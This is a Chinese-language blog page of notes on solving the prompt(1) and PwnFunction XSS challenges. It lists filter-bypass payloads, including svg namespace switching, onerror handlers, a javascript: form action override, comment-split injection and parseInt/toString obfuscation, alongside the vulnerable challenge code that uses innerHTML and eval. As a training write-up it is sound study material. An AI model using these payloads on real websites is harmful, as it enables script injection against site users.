&lt;h2 id=&#34;prompt1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#prompt1&#34;&gt;#&lt;/a&gt; prompt(1)&lt;/h2&gt;
&lt;p&gt;2&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;eval.call&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;prompt`1`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg&amp;gt;&amp;lt;script&amp;gt;prompt&amp;amp;#40;1)   切换命名空间&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;最好不要编码符号&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;5&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;aaa&amp;quot; onerror&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=&amp;quot;prompt(1)&amp;quot; src=111 type=&amp;quot;image &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;6&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form&amp;gt;中注入&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;// e.g. http://httpbin.org/post#&amp;#123;&amp;quot;name&amp;quot;:&amp;quot;Matt&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form action=&amp;quot;http://httpbin.org/post&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;&amp;lt;input name=&amp;quot;name&amp;quot; value=&amp;quot;Matt&amp;quot;&amp;gt;&amp;lt;/form&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;javascript:prompt(1)#&amp;#123;&amp;quot;action&amp;quot;:&amp;quot;Matt&amp;quot;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;form action=&amp;quot;javascript:prompt(1)&amp;quot; method=&amp;quot;post&amp;quot;&amp;gt;&amp;lt;input name=&amp;quot;action&amp;quot; value=&amp;quot;Matt&amp;quot;&amp;gt;&amp;lt;/form&amp;gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;通过input action覆盖form action&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;                                                  \n\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    // forbid javascript: or vbscript: and data: stuff    \n\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    if (!/script:|data:/i.test(document.forms[0].action)) \n\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        document.forms[0].submit();                       \n\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    else                                                  \n\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        document.write(&amp;quot;Action forbidden.&amp;quot;)               \n\&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;   &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;7&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;/*#*/prompt/*#*/(1)/*#*/&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;p class=&amp;quot;comment&amp;quot; title=&amp;quot;&amp;quot;&amp;gt;&amp;lt;script&amp;gt;/*&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;p class=&amp;quot;comment&amp;quot; title=&amp;quot;*/prompt/*&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;p class=&amp;quot;comment&amp;quot; title=&amp;quot;*/(1)/*&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;p class=&amp;quot;comment&amp;quot; title=&amp;quot;*/&amp;lt;/script&amp;gt;&amp;quot;&amp;gt;&amp;lt;/p&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;8&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;U+005C:反斜杠(reverse solidus)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;U+000D:回车 (carriage return)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;U+2028:行分隔符(line separator)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;U+2029∶段分隔符(paragraph separator)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;u+000A:换行符（line feed)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;\u2028prompt(1)\u2028--&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;10&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;prom&amp;#x27;pt(1)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;11&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;(prompt(1))in&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;12&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;parseInt  转为x进制数的十进制数,x范围为2-36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36 = [a-z] + [0-9]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果第一个字符不能转为进制返回nan&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;p = 10+16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseInt(&amp;#x27;prompt&amp;#x27;,30)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;进制数必须大于30，必须要大于t的进制数 t = 10 + 20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseInt(&amp;#x27;p&amp;#x27;,25)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;NaN&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseInt(&amp;#x27;p&amp;#x27;,26)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseInt(&amp;#x27;p&amp;#x27;,27)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseInt(&amp;#x27;p&amp;#x27;,36)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseInt(&amp;#x27;prompt&amp;#x27;,29)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18361375&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;parseInt(&amp;#x27;prompt&amp;#x27;,30)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;630038579&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18361375..toString(29)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;promp&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;630038579..toString(30)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;prompt&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r是28进制数，如果27仍是p的结果&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval(630038579..toString(30))(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval(&amp;#x27;prompt&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ƒ prompt() &amp;#123; [native code] &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a = eval(&amp;#x27;prompt&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ƒ prompt() &amp;#123; [native code] &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;a(1)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;F&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;svg命名空间中使用xml语法，且xml注释和html注释一样&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt;&amp;lt;svg&amp;gt;....&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果不进行命名空间切换，script无法识别html注释&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;写在最前：&lt;/p&gt;
&lt;p&gt;做 pwnfunction 时时刻注意：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name = &amp;quot;&amp;lt;script&amp;gt;alert(&amp;#x27;I am John in an annoying alert!&amp;#x27;)&amp;lt;/script&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;el.innerHTML = name; // harmless in this case&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;这种看似xss的方式是行不通的&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HTML 5 中指定不执行由 innerHTML 插入的 &amp;lt;script&amp;gt; 标签。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然而，有很多不依赖 &amp;lt;script&amp;gt; 标签去执行 JavaScript 的方式。所以当你使用innerHTML 去设置你无法控制的字符串时，这仍然是一个安全问题。例如：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;const name = &amp;quot;&amp;lt;img src=&amp;#x27;x&amp;#x27; onerror=&amp;#x27;alert(1)&amp;#x27;&amp;gt;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;el.innerHTML = name; // shows the alert&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Copy to Clipboard&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;基于这个原因，当插入纯文本时，建议不要使用 innerHTML 。取而代之的是使用 Node.textContent ，它不会把给定的内容解析为 HTML，它仅仅是将原始文本插入给定的位置。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 如果一个 &amp;lt;div&amp;gt;, &amp;lt;span&amp;gt;, 或 &amp;lt;noembed&amp;gt; 节点有一个文本子节点，该节点包含字符 (&amp;amp;), (&amp;lt;), 或 (&amp;gt;), innerHTML 将这些字符分别返回为 &amp;amp;amp;, &amp;amp;lt; 和 &amp;amp;gt;。使用Node.textContent 可获取一个这些文本节点内容的正确副本。&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;ma-spaghet&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ma-spaghet&#34;&gt;#&lt;/a&gt; Ma Spaghet&lt;/h2&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;somebody = &amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;尽管这看上去像cross-site scripting攻击，结果并不会导致什么。HTML 5中指定不执行由innerHTML插入的&amp;lt;script&amp;gt;标签。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;然而，有很多不依赖&amp;lt;script&amp;gt;标签去执行JavaScript的方式。所以当你使用innerHTML去设置你无法控制的字符串时，这仍然是一个安全问题。例如:&amp;lt;img&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;h2 id=&amp;quot;spaghet&amp;quot;&amp;gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    spaghet.innerHTML = (new URL(location).searchParams.get(&amp;#x27;somebody&amp;#x27;) || &amp;quot;Somebody&amp;quot;) + &amp;quot; Toucha Ma Spaghet!&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;svg onload=alert(1337)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;jefff&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#jefff&#34;&gt;#&lt;/a&gt; Jefff&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9kZXZlbG9wZXIubW96aWxsYS5vcmcvemgtQ04vZG9jcy9XZWIvSmF2YVNjcmlwdC9SZWZlcmVuY2UvR2xvYmFsX09iamVjdHMvZXZhbA==&#34;&gt;eval() - JavaScript | MDN (mozilla.org)&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zb3VyY2VncmFwaC5jb20vZ2l0aHViLmNvbS93YW5nZG9jL2phdmFzY3JpcHQtdHV0b3JpYWwvLS9ibG9iL2RvY3MvdHlwZXMvZnVuY3Rpb24ubWQ=&#34;&gt;function.md - wangdoc/javascript-tutorial - Sourcegraph&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;h2 id=&amp;quot;maname&amp;quot;&amp;gt;&amp;lt;/h2&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    let jeff = (new URL(location).searchParams.get(&amp;#x27;jeff&amp;#x27;) || &amp;quot;JEFFF&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    let ma = &amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    eval(`ma = &amp;quot;Ma name $&amp;#123;jeff&amp;#125;&amp;quot;`)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    setTimeout(_ =&amp;gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        maname.innerText = ma&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;, 1000)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;eval([&amp;quot;&amp;quot;,&amp;quot;&amp;quot;],prompt(1))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;(2) [&amp;#x27;&amp;#x27;, &amp;#x27;&amp;#x27;]&lt;/span&gt;&lt;br&gt;&lt;span 